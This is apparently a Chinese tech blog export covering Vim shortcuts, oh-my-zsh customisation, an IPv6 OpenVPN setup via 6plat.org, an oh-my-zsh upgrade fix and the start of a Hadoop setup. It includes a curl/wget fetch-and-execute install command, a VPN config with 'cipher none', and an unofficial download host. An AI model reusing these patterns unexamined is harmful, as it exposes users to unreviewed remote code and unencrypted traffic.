</table>
</div>
<h3 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>~</code></td>
<td style="text-align:left">切换大小写</td>
</tr>
<tr>
<td style="text-align:left"><code>d</code></td>
<td style="text-align:left">删除一个词</td>
</tr>
<tr>
<td style="text-align:left"><code>c</code></td>
<td style="text-align:left">变更</td>
</tr>
<tr>
<td style="text-align:left"><code>y</code></td>
<td style="text-align:left">复制</td>
</tr>
<tr>
<td style="text-align:left"><code>&gt;</code></td>
<td style="text-align:left">右移</td>
</tr>
<tr>
<td style="text-align:left"><code>&lt;</code></td>
<td style="text-align:left">左移</td>
</tr>
<tr>
<td style="text-align:left"><code>!</code></td>
<td style="text-align:left">通过外部命令进行过滤</td>
</tr>
</tbody>
</table>
</div>
<h3 id="保存、退出"><a href="#保存、退出" class="headerlink" title="保存、退出"></a>保存、退出</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>:q</code></td>
<td style="text-align:left">退出 Vim，如果文件已被修改，将退出失败</td>
</tr>
<tr>
<td style="text-align:left"><code>:w</code></td>
<td style="text-align:left">保存文件</td>
</tr>
<tr>
<td style="text-align:left"><code>:w new_name</code></td>
<td style="text-align:left">用 new_name 作为文件名保存文件</td>
</tr>
<tr>
<td style="text-align:left"><code>:wq</code></td>
<td style="text-align:left">保存文件并退出 Vim</td>
</tr>
<tr>
<td style="text-align:left"><code>:q!</code></td>
<td style="text-align:left">退出 Vim，不保存文件改动</td>
</tr>
<tr>
<td style="text-align:left"><code>ZZ</code></td>
<td style="text-align:left">退出 Vim，如果文件被改动过，保存改动内容</td>
</tr>
<tr>
<td style="text-align:left"><code>ZQ</code></td>
<td style="text-align:left">与 :q! 相同，退出 Vim，不保存文件改动</td>
</tr>
</tbody>
</table>
</div>
<h1 id="编辑视图"><a href="#编辑视图" class="headerlink" title="编辑视图"></a>编辑视图</h1><h2 id="插件-1"><a href="#插件-1" class="headerlink" title="插件"></a>插件</h2><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">按键</th>
<th style="text-align:left">映射键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>Ctrl+d</code></td>
<td style="text-align:left"><code>&lt;Esc&gt;:set cmdheight=2&lt;CR&gt;a</code></td>
<td style="text-align:left">修改命令行行数</td>
</tr>
<tr>
<td style="text-align:left"><code>Ctrl+t</code></td>
<td style="text-align:left"><code>&lt;Esc&gt;:set cmdheight=10&lt;CR&gt;a</code></td>
<td style="text-align:left">修改命令行行数</td>
</tr>
</tbody>
</table>
</div>
<h2 id="vim默认快捷键-1"><a href="#vim默认快捷键-1" class="headerlink" title="vim默认快捷键"></a>vim默认快捷键</h2><h3 id="控制光标-1"><a href="#控制光标-1" class="headerlink" title="控制光标"></a>控制光标</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>h</code></td>
<td style="text-align:left">光标向左移动一个字符</td>
</tr>
<tr>
<td style="text-align:left"><code>j</code> 或 <code>Ctrl + J</code></td>
<td style="text-align:left">光标向下移动一行</td>
</tr>
<tr>
<td style="text-align:left"><code>k</code> 或 <code>Ctrl + P</code></td>
<td style="text-align:left">光标向上移动一行</td>
</tr>
<tr>
<td style="text-align:left"><code>l</code></td>
<td style="text-align:left">光标向右移动一个字符</td>
</tr>
<tr>
<td style="text-align:left"><code>0</code></td>
<td style="text-align:left">（数字 0）移动光标至本行开头</td>
</tr>
<tr>
<td style="text-align:left"><code>$</code></td>
<td style="text-align:left">移动光标至本行末尾</td>
</tr>
<tr>
<td style="text-align:left"><code>^</code></td>
<td style="text-align:left">移动光标至本行第一个非空字符处</td>
</tr>
<tr>
<td style="text-align:left"><code>w</code></td>
<td style="text-align:left">向前移动一个词 （上一个字母和数字组成的词之后）</td>
</tr>
<tr>
<td style="text-align:left"><code>W</code></td>
<td style="text-align:left">向前移动一个词 （以空格分隔的词）</td>
</tr>
<tr>
<td style="text-align:left"><code>5w</code></td>
<td style="text-align:left">向前移动五个词</td>
</tr>
<tr>
<td style="text-align:left"><code>b</code></td>
<td style="text-align:left">向后移动一个词 （下一个字母和数字组成的词之前）</td>
</tr>
<tr>
<td style="text-align:left"><code>B</code></td>
<td style="text-align:left">向后移动一个词 （以空格分隔的词）</td>
</tr>
<tr>
<td style="text-align:left"><code>5b</code></td>
<td style="text-align:left">向后移动五个词</td>
</tr>
<tr>
<td style="text-align:left"><code>G</code></td>
<td style="text-align:left">移动至文件末尾</td>
</tr>
<tr>
<td style="text-align:left"><code>gg</code></td>
<td style="text-align:left">移动至文件开头</td>
</tr>
</tbody>
</table>
</div>
<h3 id="文档预览-1"><a href="#文档预览-1" class="headerlink" title="文档预览"></a>文档预览</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>(</code></td>
<td style="text-align:left">跳转到上一句</td>
</tr>
<tr>
<td style="text-align:left"><code>)</code></td>
<td style="text-align:left">跳转到下一句</td>
</tr>
<tr>
<td style="text-align:left"><code>&#123;</code></td>
<td style="text-align:left">跳转到上一段</td>
</tr>
<tr>
<td style="text-align:left"><code>&#125;</code></td>
<td style="text-align:left">跳转到下一段</td>
</tr>
<tr>
<td style="text-align:left"><code>[[</code></td>
<td style="text-align:left">跳转到上一部分</td>
</tr>
<tr>
<td style="text-align:left"><code>]]</code></td>
<td style="text-align:left">跳转到下一部分</td>
</tr>
<tr>
<td style="text-align:left"><code>[]</code></td>
<td style="text-align:left">跳转到上一部分的末尾</td>
</tr>
<tr>
<td style="text-align:left"><code>][</code></td>
<td style="text-align:left">跳转到上一部分的开头</td>
</tr>
</tbody>
</table>
</div>
<h3 id="插入-1"><a href="#插入-1" class="headerlink" title="插入"></a>插入</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>a</code></td>
<td style="text-align:left">在光标后插入文本</td>
</tr>
<tr>
<td style="text-align:left"><code>A</code></td>
<td style="text-align:left">在行末插入文本</td>
</tr>
<tr>
<td style="text-align:left"><code>i</code></td>
<td style="text-align:left">在光标前插入文本</td>
</tr>
<tr>
<td style="text-align:left"><code>o</code></td>
<td style="text-align:left">（小写字母 o）在光标下方新开一行</td>
</tr>
<tr>
<td style="text-align:left"><code>O</code></td>
<td style="text-align:left">（大写字母 O）在光标上方新开一行</td>
</tr>
<tr>
<td style="text-align:left"><code>:r [filename]</code></td>
<td style="text-align:left">在光标下方插入文件 [filename] 的内容</td>
</tr>
<tr>
<td style="text-align:left"><code>:r ![command]</code></td>
<td style="text-align:left">执行命令 [command] ，并将输出插入至光标下方</td>
</tr>
</tbody>
</table>
</div>
<h3 id="删除-1"><a href="#删除-1" class="headerlink" title="删除"></a>删除</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>x</code></td>
<td style="text-align:left">删除光标处字符</td>
</tr>
<tr>
<td style="text-align:left"><code>dw</code></td>
<td style="text-align:left">删除一个词</td>
</tr>
<tr>
<td style="text-align:left"><code>d0</code></td>
<td style="text-align:left">删至行首</td>
</tr>
<tr>
<td style="text-align:left"><code>d$</code></td>
<td style="text-align:left">删至行末</td>
</tr>
<tr>
<td style="text-align:left"><code>d)</code></td>
<td style="text-align:left">删至句末</td>
</tr>
<tr>
<td style="text-align:left"><code>dgg</code></td>
<td style="text-align:left">删至文件开头</td>
</tr>
<tr>
<td style="text-align:left"><code>dG</code></td>
<td style="text-align:left">删至文件末尾</td>
</tr>
<tr>
<td style="text-align:left"><code>dd</code></td>
<td style="text-align:left">删除该行</td>
</tr>
<tr>
<td style="text-align:left"><code>3dd</code></td>
<td style="text-align:left">删除三行</td>
</tr>
</tbody>
</table>
</div>
<h3 id="替换-1"><a href="#替换-1" class="headerlink" title="替换"></a>替换</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>r&#123;text&#125;</code></td>
<td style="text-align:left">将光标处的字符替换成 {text}</td>
</tr>
<tr>
<td style="text-align:left"><code>R</code></td>
<td style="text-align:left">进入覆写模式，输入的字符将替换原有的字符</td>
</tr>
</tbody>
</table>
</div>
<h3 id="撤销重做-1"><a href="#撤销重做-1" class="headerlink" title="撤销重做"></a>撤销重做</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>u</code></td>
<td style="text-align:left">撤销最后的操作</td>
</tr>
<tr>
<td style="text-align:left"><code>Ctrl+r</code></td>
<td style="text-align:left">重做最后撤销的操作</td>
</tr>
</tbody>
</table>
</div>
<h3 id="搜索、替换-1"><a href="#搜索、替换-1" class="headerlink" title="搜索、替换"></a>搜索、替换</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>/search_text</code></td>
<td style="text-align:left">检索文档，在文档后面的部分搜索 search_text</td>
</tr>
<tr>
<td style="text-align:left"><code>?search_text</code></td>
<td style="text-align:left">检索文档，在文档前面的部分搜索 search_text</td>
</tr>
<tr>
<td style="text-align:left"><code>n</code></td>
<td style="text-align:left">移动到后一个检索结果</td>
</tr>
<tr>
<td style="text-align:left"><code>N</code></td>
<td style="text-align:left">移动到前一个检索结果</td>
</tr>
<tr>
<td style="text-align:left"><code>:%s/original/replacement</code></td>
<td style="text-align:left">检索第一个 “original” 字符串并将其替换成 “replacement”</td>
</tr>
<tr>
<td style="text-align:left"><code>:%s/original/replacement/g</code></td>
<td style="text-align:left">检索并将所有的 “original” 替换为 “replacement”</td>
</tr>
<tr>
<td style="text-align:left"><code>:%s/original/replacement/gc</code></td>
<td style="text-align:left">检索出所有的 “original” 字符串，但在替换成 “replacement” 前，先询问是否替换</td>
</tr>
</tbody>
</table>
</div>
<h4 id="书签-1"><a href="#书签-1" class="headerlink" title="书签"></a>书签</h4><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>m &#123;a-zA-Z&#125;</code></td>
<td style="text-align:left">在当前光标位置设置书签，书签名可用一个大小写字母（{a-zA-Z}）</td>
</tr>
<tr>
<td style="text-align:left"><code>:marks</code></td>
<td style="text-align:left">列出所有书签</td>
</tr>
<tr>
<td style="text-align:left"><code>&#123;a-zA-Z&#125;</code></td>
<td style="text-align:left">跳转到书签 {a-zA-Z}</td>
</tr>
</tbody>
</table>
</div>
<h3 id="可视模式-1"><a href="#可视模式-1" class="headerlink" title="可视模式"></a>可视模式</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>v</code></td>
<td style="text-align:left">进入逐字可视模式</td>
</tr>
<tr>
<td style="text-align:left"><code>V</code></td>
<td style="text-align:left">进入逐行可视模式</td>
</tr>
<tr>
<td style="text-align:left"><code>Esc</code></td>
<td style="text-align:left">退出可视模式</td>
</tr>
</tbody>
</table>
</div>
<h3 id="修改-1"><a href="#修改-1" class="headerlink" title="修改"></a>修改</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>~</code></td>
<td style="text-align:left">切换大小写</td>
</tr>
<tr>
<td style="text-align:left"><code>d</code></td>
<td style="text-align:left">删除一个词</td>
</tr>
<tr>
<td style="text-align:left"><code>c</code></td>
<td style="text-align:left">变更</td>
</tr>
<tr>
<td style="text-align:left"><code>y</code></td>
<td style="text-align:left">复制</td>
</tr>
<tr>
<td style="text-align:left"><code>&gt;</code></td>
<td style="text-align:left">右移</td>
</tr>
<tr>
<td style="text-align:left"><code>&lt;</code></td>
<td style="text-align:left">左移</td>
</tr>
<tr>
<td style="text-align:left"><code>!</code></td>
<td style="text-align:left">通过外部命令进行过滤</td>
</tr>
</tbody>
</table>
</div>
<h3 id="保存、退出-1"><a href="#保存、退出-1" class="headerlink" title="保存、退出"></a>保存、退出</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>:q</code></td>
<td style="text-align:left">退出 Vim，如果文件已被修改，将退出失败</td>
</tr>
<tr>
<td style="text-align:left"><code>:w</code></td>
<td style="text-align:left">保存文件</td>
</tr>
<tr>
<td style="text-align:left"><code>:w new_name</code></td>
<td style="text-align:left">用 new_name 作为文件名保存文件</td>
</tr>
<tr>
<td style="text-align:left"><code>:wq</code></td>
<td style="text-align:left">保存文件并退出 Vim</td>
</tr>
<tr>
<td style="text-align:left"><code>:q!</code></td>
<td style="text-align:left">退出 Vim，不保存文件改动</td>
</tr>
<tr>
<td style="text-align:left"><code>ZZ</code></td>
<td style="text-align:left">退出 Vim，如果文件被改动过，保存改动内容</td>
</tr>
<tr>
<td style="text-align:left"><code>ZQ</code></td>
<td style="text-align:left">与 :q! 相同，退出 Vim，不保存文件改动</td>
</tr>
</tbody>
</table>
</div>
]]></content>
      <categories>
        <category>vim</category>
      </categories>
      <tags>
        <tag>vim</tag>
      </tags>
  </entry>
  <entry>
    <title>zsh定制</title>
    <url>/posts/3c1075a3/</url>
    <content><![CDATA[<p>先安装<a href="https://github.com/zsh-users/zsh"><code>zsh</code></a></p>
<h1 id="安装oh-my-zsh（需要代理）"><a href="#安装oh-my-zsh（需要代理）" class="headerlink" title="安装oh-my-zsh（需要代理）"></a>安装<a href="https://github.com/robbyrussell/oh-my-zsh">oh-my-zsh</a>（需要代理）</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># curl方式</span></span><br><span class="line">sh -c <span class="string">&quot;<span class="subst">$(curl -fsSL https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># wget方式</span></span><br><span class="line">sh -c <span class="string">&quot;<span class="subst">$(wget -O- https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)</span>&quot;</span></span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h1 id="自带功能"><a href="#自带功能" class="headerlink" title="自带功能"></a>自带功能</h1><h2 id="自带插件"><a href="#自带插件" class="headerlink" title="自带插件"></a><a href="https://github.com/robbyrussell/oh-my-zsh/wiki/Plugins">自带插件</a></h2><p>  <strong>启用自带插件只需修改<code>~/.zshrc</code>文件，在<code>plugins=()</code>中加入插件名即可启用</strong><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">plugins&#x3D;(git extract z sudo</span><br><span class="line">		per-directory-history</span><br><span class="line">		sublime</span><br><span class="line">		vscode</span><br><span class="line">		)</span><br></pre></td></tr></table></figure></p>
<p>  插件文件放在<code>~/.oh-my-zsh/plugins</code></p>
<p>  <strong>git</strong>: 定义了git的别名</p>
<p>  <strong>extract</strong>: 解压；tar、gz、zip、rar全部使用extract命令解压</p>
<p>  <strong>z</strong>: 快速跳转目录；<code>cd ~/user/github/git</code> 进入文件夹，下一次想进入 git 文件夹的时候,直接 <code>z git</code> 即可；<code>z -x 不要的路径</code>可删除不需要的</p>
<p>  <strong>sudo</strong>: 按两下ESC，自动在头部加上<code>sudo</code></p>
<p>  <strong>per-directory-history</strong>:目录下的命令历史</p>
<p>  <strong>sublime</strong>: Sublime Text 助手；<code>st</code>(打开Sublime Text)、<code>st 文件or项目文件夹</code>、<code>stt</code>(打开当前项目目录)、<code>sst 文件or项目文件夹</code>(相当sudo st)</p>
<p>  <strong>vscode</strong>: Visual Studio Code助手</p>
<h2 id="oh-my-zsh自带主题"><a href="#oh-my-zsh自带主题" class="headerlink" title="oh-my-zsh自带主题"></a><a href="https://github.com/robbyrussell/oh-my-zsh/wiki/Themes">oh-my-zsh自带主题</a></h2><p>  注意：有些主题需要安装<a href="https://github.com/powerline/fonts">Powerline fonts</a>才能正确呈现</p>
<p>  主题推荐:ys agnoster avit</p>
<p>  <strong>修改主题</strong>: 编辑 <code>~/.zshrc</code> 的 <code>ZSH_THEME</code> 即可</p>
<h1 id="非自带"><a href="#非自带" class="headerlink" title="非自带"></a>非自带</h1><h2 id="非自带插件"><a href="#非自带插件" class="headerlink" title="非自带插件"></a>非自带插件</h2><p><strong>非自带插件需要克隆项目到<code>~/.oh-my-zsh/plugins/</code>下</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/oh-my-zsh/plugins</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/***/xxx.git</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/***/xxx.git ~/.oh-my-zsh/plugins/xxx</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>若提示权限不足则加 sudo 即可，这是因为clone的oh-my-zsh仓库权限问题</p>
<p>  修改<code>~/.zshrc</code><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">plugins&#x3D;(</span><br><span class="line">		其他的插件</span><br><span class="line">		zsh-autosuggestions</span><br><span class="line">		zsh-syntax-highlighting</span><br><span class="line">		git-open</span><br><span class="line">		)</span><br></pre></td></tr></table></figure></p>
<p>  <a href="https://github.com/zsh-users/zsh-autosuggestions"><strong>zsh-autosuggestions</strong></a>: 自动建议</p>
<p>  <a href="https://github.com/zsh-users/zsh-syntax-highlighting"><strong>zsh-syntax-highlighting</strong></a>: 命令高亮显示</p>
<p>  <a href="https://github.com/paulirish/git-open"><strong>git-open</strong></a>: <code>git open</code>打开当前项目的远程仓库地址</p>
<h2 id="外部主题"><a href="#外部主题" class="headerlink" title="外部主题"></a><a href="https://github.com/robbyrussell/oh-my-zsh/wiki/External-themes">外部主题</a></h2><p>  推荐: <a href="https://github.com/fdaciuk/avit-da2k">avit-da2k</a> , <a href="https://github.com/Powerlevel9k/powerlevel9k">powerlevel9k</a> , <a href="https://github.com/denysdovhan/spaceship-prompt">Spaceship ZSH</a> ,  <a href="https://github.com/tobyjamesthomas/pi">Pi</a></p>
<p>  更外部主题可直接在github上搜索<code>zsh-theme</code>获取</p>
<h1 id="oh-my-zsh-配置"><a href="#oh-my-zsh-配置" class="headerlink" title="oh-my-zsh 配置"></a>oh-my-zsh 配置</h1><p>  默认情况下，oh-my-zsh每隔几周检查一次升级，如果希望不升级，在 <code>~/.zshrc</code> 中设置以下内容:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 禁用提示升级</span><br><span class="line">DISABLE_UPDATE_PROMPT&#x3D;true</span><br><span class="line"></span><br><span class="line"># 禁用自动升级</span><br><span class="line">DISABLE_AUTO_UPDATE&#x3D;true</span><br></pre></td></tr></table></figure>
<p>手动升级使用 <code>upgrade_oh_my_zsh</code> 命令</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>个人固定IPv6地址申请</title>
    <url>/posts/b446117f/</url>
    <content><![CDATA[<h1 id="个人固定IPv6地址申请"><a href="#个人固定IPv6地址申请" class="headerlink" title="个人固定IPv6地址申请"></a>个人固定IPv6地址申请</h1><h4 id="申请"><a href="#申请" class="headerlink" title="申请"></a>申请</h4><p>该IPv6的地址由<code>6plat.org</code>提供，然后通过VPN实现IPv6，据说IPv6在墙外</p>
<p><strong>使用公共账号（动态分配地址）</strong></p>
<p>用户名和密码都是<code>6plat.org</code></p>
<p><strong>个人账号（固定地址）</strong></p>
<a id="more"></a>
<p>需要固定IPv6地址的个人用户，可发申请邮件到【 6plat@biigroup.cn 】 ，注明用户名密码，账号后台自动开通，收到自动回复邮件，账号会在2个工作日内开通。<br>申请到个人账号之后，可以使用静态IPv6地址。重点是个人账号可以享受带宽保障策略</p>
<p><strong>申请格式：</strong><br><strong><em>主题</em></strong><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">6Plat-46个人账号申请</span><br></pre></td></tr></table></figure><br><strong><em>内容</em></strong></p>
<blockquote>
<p>用户名(空格)密码<br>例如：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yonghuming mima</span><br></pre></td></tr></table></figure><br>用户名不支持中文和大小写</p>
</blockquote>
<h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><p><a href="http://bbs2.6plat.org/d/19">参考官方使用手册</a></p>
<p>通过<code>openvpn</code>链接VPN使用IPv6<br><strong>下载安装openvpn客户端</strong><br><a href="https://www.lanzous.com/b938806/">Mac、Win7、Win10</a>密码:eonun</p>
<p><code>Linux</code>上直接通过不同发行版的包管理器进行网络源安装，包名：<code>openvpn</code>，部分Linux内置了，只需添加配置即可使用</p>
<p><code>Android</code>在谷歌应用商店下载</p>
<p><code>ios</code>在App Store下载</p>
<p><strong>创建配置文件</strong><br>创建名为<code>6plat.ovpn</code>的配置文件，将配置文件导入到客户端，连接时输入账号密码即可<br>配置文件内容：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">client</span><br><span class="line">dev tun</span><br><span class="line">proto tcp</span><br><span class="line">remote 46.6plat.org 9185</span><br><span class="line">comp-lzo</span><br><span class="line">resolv-retry infinite</span><br><span class="line">nobind</span><br><span class="line">persist-key</span><br><span class="line">persist-tun</span><br><span class="line">setenv CLIENT_CERT 0</span><br><span class="line">auth-user-pass</span><br><span class="line">remote-cert-tls server</span><br><span class="line">verb 3</span><br><span class="line">sndbuf 0</span><br><span class="line">rcvbuf 0</span><br><span class="line">route-ipv6 ::&#x2F;0 240c:f:1:6000::1</span><br><span class="line">cipher none</span><br><span class="line">&lt;ca&gt;</span><br><span class="line">-----BEGIN CERTIFICATE-----</span><br><span class="line">MIIE3zCCA8egAwIBAgIJAJVvrlqcS4YsMA0GCSqGSIb3DQEBCwUAMIGlMQswCQYD</span><br><span class="line">VQQGEwJDTjEQMA4GA1UECBMHQmVpamluZzEQMA4GA1UEBxMHQmVpamluZzESMBAG</span><br><span class="line">A1UEChMJNnBsYXQub3JnMRMwEQYDVQQLEwo2cGxhdGdyb3VwMRUwEwYDVQQDEww2</span><br><span class="line">cGxhdC5vcmcgQ0ExEDAOBgNVBCkTB0Vhc3lSU0ExIDAeBgkqhkiG9w0BCQEWETZw</span><br><span class="line">bGF0QGJpaWdyb3VwLmNuMB4XDTE3MDEwNDA5MTc1NVoXDTI3MDEwMjA5MTc1NVow</span><br><span class="line">gaUxCzAJBgNVBAYTAkNOMRAwDgYDVQQIEwdCZWlqaW5nMRAwDgYDVQQHEwdCZWlq</span><br><span class="line">aW5nMRIwEAYDVQQKEwk2cGxhdC5vcmcxEzARBgNVBAsTCjZwbGF0Z3JvdXAxFTAT</span><br><span class="line">BgNVBAMTDDZwbGF0Lm9yZyBDQTEQMA4GA1UEKRMHRWFzeVJTQTEgMB4GCSqGSIb3</span><br><span class="line">DQEJARYRNnBsYXRAYmlpZ3JvdXAuY24wggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw</span><br><span class="line">ggEKAoIBAQDpTRpxYttg0EsUYWCE3GKLMPTDXlzVtn93yb9MdgUJkCiGNgaXHQ6Y</span><br><span class="line">NCcOXb3pLIxZN7eYH873ZgAY74+LiEIIAAPn+CTQjTcZ82r92xuSj47mMNd4&#x2F;CcG</span><br><span class="line">5byC9clsNijsWvJ7Rq2Fy2ynSddWMMkmVGZ8oS3psPc57cEOBUBdhTI4szo6aLE0</span><br><span class="line">N3&#x2F;AAFpIdfxlTATc5EWFxEk4SMPWAIcqkvZ1ETBit+HHU+Bv2oYcpzzi6jHmVw0d</span><br><span class="line">EofxV0w3AUNUN894mWprBtZKZ+DVqms0+LI3mLWPXsv3m8zYBNTXqgE5p4vJ+E3J</span><br><span class="line">3AzDKH2Rb&#x2F;coBiy3V2g0Cdgc9vATQ4XzAgMBAAGjggEOMIIBCjAdBgNVHQ4EFgQU</span><br><span class="line">M&#x2F;hZJqaKeV9UVH6WoS7iwAk8&#x2F;Q0wgdoGA1UdIwSB0jCBz4AUM&#x2F;hZJqaKeV9UVH6W</span><br><span class="line">oS7iwAk8&#x2F;Q2hgaukgagwgaUxCzAJBgNVBAYTAkNOMRAwDgYDVQQIEwdCZWlqaW5n</span><br><span class="line">MRAwDgYDVQQHEwdCZWlqaW5nMRIwEAYDVQQKEwk2cGxhdC5vcmcxEzARBgNVBAsT</span><br><span class="line">CjZwbGF0Z3JvdXAxFTATBgNVBAMTDDZwbGF0Lm9yZyBDQTEQMA4GA1UEKRMHRWFz</span><br><span class="line">eVJTQTEgMB4GCSqGSIb3DQEJARYRNnBsYXRAYmlpZ3JvdXAuY26CCQCVb65anEuG</span><br><span class="line">LDAMBgNVHRMEBTADAQH&#x2F;MA0GCSqGSIb3DQEBCwUAA4IBAQBzYlX&#x2F;RgvViVvcxwGQ</span><br><span class="line">SN9wP32U9aALFI4GCQz6ODrlYVx4m00zJeuR69bjLO3NZgMv6LtcovbuME+FYq&#x2F;4</span><br><span class="line">uXJJIfMlo2S&#x2F;kKp5dBaGk9ERx0xs2OLAKyzc4wgx5zah5Nke1NhdYdCB6Lj6tM+s</span><br><span class="line">vthNz2SWpcctvlOvV+5IdVrefiaLl7RBgf2j81DYmPCILZwHo8rQ0zKppgqAFcFk</span><br><span class="line">tDO0FnHQcwe6xfTE1cIoOU39t+hTnvxQDBW4p9xkxX0hAFnNV41OadgEwxqyo6J0</span><br><span class="line">BZ4dtEw8E9FFF8ewWl897xSv6AMPZTizFl3OReE376Kgv+gtFlSuj4kizCd7uiRp</span><br><span class="line">o5ab</span><br><span class="line">-----END CERTIFICATE-----</span><br><span class="line">&lt;&#x2F;ca&gt;</span><br></pre></td></tr></table></figure></p>
<p><strong>Openwrt路由器使用IPv6</strong>参考以下文章<br>教你通过路由器部署IPv6环境【<a href="https://blog.csdn.net/baidu_35946698/article/details/80124956">上篇</a>】，【<a href="https://blog.csdn.net/baidu_35946698/article/details/80125282">下篇</a>】<br><a href="http://www.zhangjun.sh.cn/index.php/linux/openwrt-6plat-ipv6.html">OpenWrt利用6plat部署IPv6环境</a></p>
]]></content>
      <categories>
        <category>技能</category>
      </categories>
      <tags>
        <tag>IPv6</tag>
      </tags>
  </entry>
  <entry>
    <title>修改主题后oh-my-zsh升级失败解决</title>
    <url>/posts/4c096b11/</url>
    <content><![CDATA[<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[Oh My Zsh] Would you like to check <span class="keyword">for</span> updates? [Y/n]: y</span><br><span class="line">Updating Oh My Zsh</span><br><span class="line">error: cannot pull with rebase: You have unstaged changes.</span><br><span class="line">error: please commit or stash them.</span><br><span class="line">There was an error updating. Try again later?</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[oh-my-zsh] Would you like to update? [Y/n] y</span><br><span class="line">Updating Oh My Zsh</span><br><span class="line">error: 无法拉取，因为您有未合并的文件。</span><br><span class="line">提示：请在工作区改正文件，然后酌情使用 <span class="string">&#x27;git add/rm &lt;文件&gt;&#x27;</span> 命令标记</span><br><span class="line">提示：解决方案并提交。</span><br><span class="line">fatal: 因为存在未解决的冲突而退出。</span><br><span class="line">There was an error updating. Try again later?</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<p>出现这个问题的原因是我们对<code>.oh-my-zsh</code>里的内容进行了更改之后没有提交<br>通过终端进入<code>.oh-my-zsh</code>目录之后输入<code>git status</code>，看到主题文件发生了更改，且没有提交</p>
<h1 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h1><h2 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h2><p>把变更提交即可<br><code>git add .</code><br><code>git commit -m &#39;对更改的描述&#39;</code></p>
<h2 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h2><p><code>cd  “ $ ZSH ”  &amp;&amp; git stash &amp;&amp; upgrade_oh_my_zsh &amp;&amp; git stash pop</code></p>
<p>尝试<code>git stash</code>然后运行升级，然后<code>git stash pop</code>之后，找回更改</p>
]]></content>
      <categories>
        <category>Zsh</category>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Zsh</tag>
      </tags>
  </entry>
  <entry>
    <title>先电云计算BigData</title>
    <url>/posts/be12ee32/</url>
    <content><![CDATA[<h2 id="基础平台搭建"><a href="#基础平台搭建" class="headerlink" title="基础平台搭建"></a>基础平台搭建</h2><h3 id="master"><a href="#master" class="headerlink" title="master"></a>master</h3><p><strong><code>hostnamectl set-hostname master</code></strong>        //修改主机名</p>
<p><strong><code>hostname</code></strong></p>
<p><strong><code>logout</code></strong></p>
<p><strong><code>vi /etc/hosts</code></strong>                            //添加本地域名解析</p>
<blockquote>
<p>192.168.200.131 master.hadoop master</p>
<p>192.168.200.133 slave1.hadoop</p>
</blockquote>
<a id="more"></a>
